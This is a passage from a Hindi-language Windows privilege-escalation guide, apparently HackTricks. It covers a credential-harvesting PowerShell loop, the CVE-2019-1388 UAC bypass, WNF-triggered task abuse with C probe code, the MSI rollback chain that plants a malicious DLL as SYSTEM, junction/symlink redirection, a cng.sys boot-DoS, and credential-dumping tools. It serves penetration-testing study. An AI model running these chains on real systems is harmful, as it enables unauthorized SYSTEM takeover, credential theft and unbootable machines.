किसी user के रूप में shell मिलने पर, scheduled tasks या दूसरी processes execute हो सकती हैं जो **command line पर credentials देती हैं**। नीचे दी गई script हर दो सेकंड में process command lines capture करती है और मौजूदा state की पिछली state से तुलना करके कोई भी अंतर दिखाती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

यदि आपको graphical interface (console या RDP के ज़रिए) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में किसी unprivileged user से terminal या "NT\AUTHORITY SYSTEM" जैसे किसी अन्य process को चलाना संभव है।

इससे एक ही vulnerability का इस्तेमाल करके privileges escalate करना और UAC bypass करना, दोनों संभव हो जाते हैं। इसके अलावा, कुछ भी install करने की ज़रूरत नहीं है और इस प्रक्रिया के दौरान इस्तेमाल किया गया binary Microsoft द्वारा signed और जारी किया गया है।

कुछ प्रभावित systems इस प्रकार हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability को exploit करने के लिए, निम्नलिखित steps पूरे करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी उपलब्ध हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level तक / UAC Bypass

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application, अनुमानित upload subdirectory बना सकता है, उसमें caller द्वारा दिया गया filename लिख सकता है और फिर फ़ाइल को process कर सकता है। अगर कम privilege वाला user, server-side write से पहले उस subdirectory को हटाकर उसकी जगह NTFS junction बना सकता है, तो write उस junction का अनुसरण करते हुए web-served directory में जा सकता है। वहाँ रखी script web-service identity के रूप में चल सकती है, अगर server उस file type को execute करता हो। यह application-specific arbitrary-write boundary है; केवल writable upload directory या पहले से मौजूद junction इसका प्रमाण नहीं है।

Upload handler में path construction और timing की सटीक जाँच करें, subdirectory पर user के प्रभावी delete/create rights देखें, destination के प्रभावी ACLs जाँचें, पता लगाएँ कि writer reparse points का अनुसरण करता है या नहीं, और देखें कि web server उस destination में files execute करता है या नहीं। Writer और web server की process identities अलग-अलग verify करें। Passive inventory से directory ACLs और reparse metadata दिख सकते हैं, लेकिन इससे handler का behavior या भविष्य में junction swap होने की पुष्टि नहीं होती। अगर execution service account के रूप में होता है, तो किसी अलग token-privilege path पर विचार करने से पहले **actual process token** की जाँच करें।

## WNF-triggered privileged scheduled-task cleanup

ऐसा scheduled task जो manual execution की अनुमति नहीं देता, फिर भी unprivileged trigger उजागर कर सकता है। किसी privileged task का audit करते समय, उसका XML export करें और task DACL, principal तथा action के साथ-साथ **सभी** triggers की जाँच करें। विशेष रूप से, `WnfStateChangeTrigger` एक Windows Notification Facility (WNF) state का नाम बताता है; अगर उस securable state पर मौजूदा user को update publish करने की अनुमति हो, तो `<AllowStartOnDemand>false</AllowStartOnDemand>` होने के बावजूद user, configured identity के अंतर्गत task को अप्रत्यक्ष रूप से शुरू कर सकता है।<sup>[[43]](#references)</sup>

उदाहरण के लिए, Recall का `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task SYSTEM के रूप में चलता था, standard user से WNF state `7508BCA32C079E41` में updates स्वीकार करता था, और Recall disabled होने पर भी `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` की जाँच करता था।<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

पहुँच-योग्यता जाँचने के लिए, `ntdll.dll` से `ZwUpdateWnfStateData` को resolve करें, आठ-बाइट वाले state name के लिए एक खाली update submit करें, और return status का मिलान task के last-run data या Procmon activity से करें। नीचे दिया गया reduced probe, Recall task के उदाहरण से byte sequence का उपयोग करता है; जाँचे जा रहे task के लिए export किए गए bytes इसके स्थान पर रखें।<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### recursive cleanup को privileged deletion में बदलना

उपयोगी primitive केवल trigger नहीं, बल्कि ऐसा privileged cleanup routine है जो attacker-नियंत्रित directory स्वीकार करता है। Enumeration से लेकर अंतिम mutation तक कार्रवाई को trace करें: profile/session discovery, wildcard से चुने गए children, `SHCreateItemFromParsingName`, और `IFileOperation::DeleteItem` इस बात के मज़बूत संकेत हैं कि पहले जाँचे गए pathname को बाद में recursively traverse किया जाएगा। यदि descendants को trusted directory handles के सापेक्ष खोलकर deletion से पहले validate नहीं किया जाता, तो attacker enumeration और उपयोग के बीच resolution बदल सकता है।<sup>[[43]](#references)</sup>

WNF trigger को नीचे बताए गए [oplock, junction और Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) के साथ जोड़ें: oplock cleaner को legitimate child चुनने के बाद रोकता है, जबकि writable ancestor को बदल दिया जाता है, ताकि फिर से शुरू हुआ privileged delete `\RPC Control` के ज़रिए protected target तक पहुँचे। Recall chain में इससे SYSTEM द्वारा `C:\Config.Msi` delete किया जा सका, जो documented MSI rollback technique के लिए ज़रूरी था।<sup>[[31]](#references)[[43]](#references)</sup>

### Nested descendants, shallow reparse-point fixes को bypass करते हैं

केवल attacker-नियंत्रित root और उसके तुरंत नीचे के child को validate करने से recursive pathname-based delete सुरक्षित नहीं होता। जाँचे गए objects को legitimate रहने दें और junction/oplock substitution को उनके नीचे एक अतिरिक्त child में रखें; `IFileOperation::DeleteItem` आखिरकार उस unvalidated descendant तक पहुँचकर उसके नए target को follow करता है। CVE-2026-20941 इसी तरह के अधूरे fix से बना था: पहले Recall patch ने `UKP` और GUID-जैसी directory को validate किया, लेकिन पुरानी recursive deletion operation बरकरार रखी।<sup>[[43]](#references)</sup>

सुरक्षित तरीका है कि **हर descendant** को पहले से trusted directory handle के सापेक्ष खोलें, अंतिम resolved path/object प्राप्त करके verify करें, और deletion disposition उसी verified handle पर लागू करें। किसी prefix को validate करके फिर recursive path-based deletion पर वापस न जाएँ। Patch review के दौरान वास्तविक call site पर structures की भी जाँच करें: इस मामले में `NtCreateFile` पर `OBJECT_ATTRIBUTES` के runtime inspection में non-null `RootDirectory` और relative `{GUID}\\secure_file.lock` name दिखा, जिसने decompiler के भ्रामक output को गलत साबित किया; उस output से दूसरी `FILE_DELETE_ON_CLOSE` primitive का संकेत मिलता था।<sup>[[43]](#references)</sup>

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

यह technique [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) बताई गई है; exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।<sup>[[31]](#references)[[32]](#references)</sup>

इस attack में मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstallation के दौरान legitimate files को malicious files से बदला जाता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer दूसरे MSI packages को uninstall करते समय rollback files इसी folder में रखेगा; उन rollback files को बदलकर उनमें malicious payload डाला जा सकता है।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

कम privilege वाला client `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering में संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये नाम और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के लिए, `SetEEUIDirectoryAndFilter` caller की impersonation केवल तब करता है जब वह दिए गए path को `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ खोलता है। इससे साबित होता है कि caller directory delete कर सकता है और reparse point को follow करने से बचा जा सकता है, लेकिन यह जाँचे गए file object को बाद के cleanup से **bind नहीं** करता और न ही यह साबित करता है कि Windows Installer ने उसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के अंतर्गत एक named `REG_DWORD` value लिखती है: value name caller-नियंत्रित path होता है और data `0x00000002` folder flag होता है। इसके बाद `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values enumerate करके folder entries को recursive `FDeleteFolder` में भेजता है, बिना path provenance जाँचे। यदि सामान्य removal विफल हो जाए, तो code `LockdownPath` भी call करता है, file attributes साफ़ करता है और फिर कोशिश करता है।<sup>[[41]](#references)</sup>

`msi.dll` से निकाला गया न्यूनतम call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive junction redirect नहीं, बल्कि path reuse है। Attacker द्वारा बनाया गया `C:\Config.Msi` register करें, उसे remove करें, और Windows Installer को बाद में उसी pathname पर protected rollback data के साथ दोबारा बनाने दें। Cleanup पुराने `TempPackages` नाम पर भरोसा करता है और नई directory को SYSTEM के रूप में delete कर देता है। यह `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation द्वारा तय की गई सीमा को bypass करता है, क्योंकि इसमें किसी reparse point की जरूरत नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain के साथ काम करता है: अलग `Installer\Folders` record को सुरक्षित रखें, protected `C:\Config.Msi` को delete करें, उसे NULL DACL के साथ दोबारा बनाएं, और installer द्वारा DACL को harden करने से पहले `WRITE_DAC` से granted handle अपने पास रखें। पहले से खुला handle `NtSetSecurityObject` से permissive DACL बहाल कर सकता है, जिसके बाद rollback फिर से शुरू होने से पहले generated `.rbs` को replace किया जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने इस path को ठीक किया: नया feature gate enabled होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` call करने से रोक दिया गया। COM call अब भी success लौटा सकती है, लेकिन attacker-controlled path अब `TempPackages` में नहीं जोड़ा जाता। सफल method return को patch test मानने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

इस technique का सारांश इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` खाली रखें)**

- Step 1: MSI install करें
    - ऐसा `.msi` बनाएं जो किसी writable folder (`TARGETDIR`) में harmless file (जैसे `dummy.txt`) install करे।
    - Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** इसे चला सके।
    - Install के बाद file पर एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
    - उसी `.msi` को uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) करना शुरू करता है।
    - File के खुले handle को `GetFinalPathNameByHandle` से **poll करें**, ताकि पता चल सके कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal देता है।
        - फिर uninstall जारी रखने से पहले किसी दूसरे event का **wait** करता है।

- Step 4: `.rbf` को delete होने से रोकें
    - Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **open करें** — इससे उसे **delete होने से रोका जाता है**।
    - फिर uninstall को पूरा होने देने के लिए signal वापस दें।
    - Windows Installer `.rbf` को delete नहीं कर पाता, और सभी contents delete न कर पाने के कारण **`C:\Config.Msi` remove नहीं होता**।

- Step 5: `.rbf` को manually delete करें
    - आप (attacker) `.rbf` file को manually delete करें।
    - अब **`C:\Config.Msi` खाली है**, और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability trigger करें**।

2. **Stage 2 – Rollback Scripts को malicious scripts से replace करना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` दोबारा बनाएं
    - `C:\Config.Msi` folder को खुद दोबारा बनाएं।
    - **कमजोर DACLs** सेट करें (जैसे Everyone:F), और `WRITE_DAC` वाला **handle खुला रखें**।

- Step 7: एक और Install चलाएं
    - `.msi` को फिर से install करें, इन settings के साथ:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: ऐसा variable जो forced failure trigger करे।
    - इस install का उपयोग फिर से **rollback** trigger करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` को monitor करें
    - `ReadDirectoryChangesW` से `C:\Config.Msi` को monitor करें, जब तक कोई नया `.rbs` न दिखे।
    - उसका filename capture करें।

- Step 9: Rollback से पहले sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनते ही एक event signal करता है।
        - फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: कमजोर ACL दोबारा लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer, `C:\Config.Msi` पर **strong ACLs दोबारा लागू करता है**।
        - लेकिन आपके पास अब भी `WRITE_DAC` वाला handle है, इसलिए आप **कमजोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **केवल handle खुलने पर लागू होते हैं**, इसलिए आप अब भी folder में लिख सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह करने का निर्देश देती है:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करे।
    - अपना fake `.rbf` डालें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
    - Installer को फिर से शुरू करने के लिए sync event signal करें।
    - एक **type 19 custom action (`ErrorOut`)** को install को एक तय बिंदु पर **जानबूझकर fail** करने के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- Step 13: SYSTEM आपका DLL install करता है
    - Windows Installer:
        - आपका malicious `.rbs` पढ़ता है।
        - आपके `.rbf` DLL को target location में copy करता है।
    - अब आपका **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में** मौजूद है।

- अंतिम Step: SYSTEM code execute करें
    - एक trusted **auto-elevated binary** (जैसे `osk.exe`) चलाएं, जो hijack किया गया DLL load करती है।
    - **धमाका**: आपका code **SYSTEM के रूप में** execute होता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली technique) मानती है कि आप **पूरा folder** (जैसे `C:\Config.Msi`) delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है, तो क्या होगा?

आप **NTFS internals** का फायदा उठा सकते हैं: हर folder में एक hidden alternate data stream होती है, जिसका नाम है:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** संग्रहीत करती है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** को **delete** करते हैं, तो NTFS उस **पूरे फ़ोल्डर** को filesystem से **हटा देता है**।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद folder को delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP तक
क्या होगा अगर आपका primitive आपको मनमानी files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled folder के *contents* को delete करने देता है**?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है, तो oplock **execution को रोक देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. चरण 3: SYSTEM process ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और control आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
    - इससे oplock को तोड़े बिना `folder1` खाली हो जाता है।
    - `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह NTFS की उस आंतरिक stream को target करता है जो folder metadata store करती है — इसे delete करने से folder delete हो जाता है।

5. Step 5: Oplock release करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### मनमाना फ़ोल्डर बनाने से स्थायी DoS तक

ऐसी primitive का exploit करें जो आपको **SYSTEM/admin के रूप में मनमाना फ़ोल्डर बनाने** देती है — भले ही **आप फ़ाइलें नहीं लिख सकते** या **कमज़ोर permissions सेट नहीं कर सकते**।

**फ़ाइल नहीं, फ़ोल्डर** बनाएँ, जिसका नाम किसी **महत्वपूर्ण Windows driver** जैसा हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```

- यह path आम तौर पर `cng.sys` kernel-mode driver से जुड़ा होता है।
- अगर आप इसे **पहले से एक folder के रूप में बना दें**, तो Windows boot के दौरान असली driver लोड नहीं कर पाता।
- इसके बाद, Windows boot के दौरान `cng.sys` लोड करने की कोशिश करता है।
- उसे folder दिखता है, **वह असली driver को resolve नहीं कर पाता**, और **boot क्रैश हो जाता है या रुक जाता है**।
- **कोई fallback नहीं है**, और बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई recovery नहीं है**।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (भले ही आपके पास SeCreateSymbolicLinkPrivilege न हो)।<sup>[[15]](#references)</sup>

**ज़रूरी शर्तें**
- Target path स्टोर करने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- कोई privileged operation जो उस path पर लिखता हो (log, export, report)।

**उदाहरण chain**
1. Privileged log destination पता करने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component के log लिखने का इंतज़ार करें (जैसे, admin द्वारा “send test SMS” ट्रिगर करना)। अब write `C:\Windows\System32\cng.sys` में होगा।
4. Overwritten target का निरीक्षण करें (hex/PE parser) और corruption की पुष्टि करें; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह तरीका किसी भी ऐसी protected file पर लागू होता है जिसे कोई privileged service write के लिए खोलेगी।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से load होती है, लेकिन अगर उसकी एक copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो उसे पहले आज़माया जा सकता है। इससे corrupt data के लिए यह एक भरोसेमंद DoS sink बन जाती है।



## **High Integrity से System तक**

### **नई service**

अगर आप पहले से किसी High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है: बस एक नई service **बनाएँ और execute करें**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक कार्रवाइयाँ जल्दी करे, क्योंकि valid service न होने पर उसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries enable** करने और _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[यहाँ शामिल registry keys और _.msi_ package install करने के तरीके के बारे में अधिक जानकारी है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास वे token privileges हैं (संभवतः आपको यह पहले से High Integrity process में मिलेगा), तो आप SeDebug privilege के साथ **लगभग किसी भी process को खोल** सकेंगे (protected processes को छोड़कर), उस process का **token copy** कर सकेंगे और उस token के साथ **arbitrary process create** कर सकेंगे।\
इस technique में आमतौर पर **ऐसा कोई process चुना जाता है जो सभी token privileges के साथ SYSTEM के रूप में चल रहा हो** (_हाँ, आपको ऐसे SYSTEM processes मिल सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**इस प्रस्तावित technique को execute करने वाले code का** [**example यहाँ मिल सकता है**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

इस technique का उपयोग meterpreter द्वारा `getsystem` में privilege escalation के लिए किया जाता है। इसमें **pipe create करना और फिर उस pipe पर लिखने के लिए service create/abuse करना** शामिल है। इसके बाद, **`SeImpersonate`** privilege का उपयोग करके pipe create करने वाला **server**, pipe client (service) के **token को impersonate** करके SYSTEM privileges प्राप्त कर सकता है।\
यदि आप [**name pipes के बारे में अधिक जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप [**name pipes का उपयोग करके high integrity से System तक जाने का example पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप SYSTEM के रूप में चल रहे किसी **process द्वारा load** की जा रही **dll को hijack** कर लेते हैं, तो आप उन permissions के साथ arbitrary code execute कर सकेंगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है; इसके अलावा, **high integrity process से इसे करना कहीं अधिक आसान है**, क्योंकि उसे dlls load करने के लिए उपयोग किए जाने वाले folders पर **write permissions** मिलेंगी।\
**आप** [**Dll hijacking के बारे में यहाँ अधिक जान सकते हैं**](dll-hijacking/index.html)**.**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच करता है और जानकारी इकट्ठा करता है (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच करता है**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए passwords को पूरे domain में spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows का basic privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजता है (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host का enumeration करता है (privesc से अधिक जानकारी इकट्ठा करने वाला tool) (compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github पर precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच करता है (github पर executable precompiled)। अनुशंसित नहीं। Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच करता है (python से exe)। अनुशंसित नहीं। Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (ठीक से काम करने के लिए इसे accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

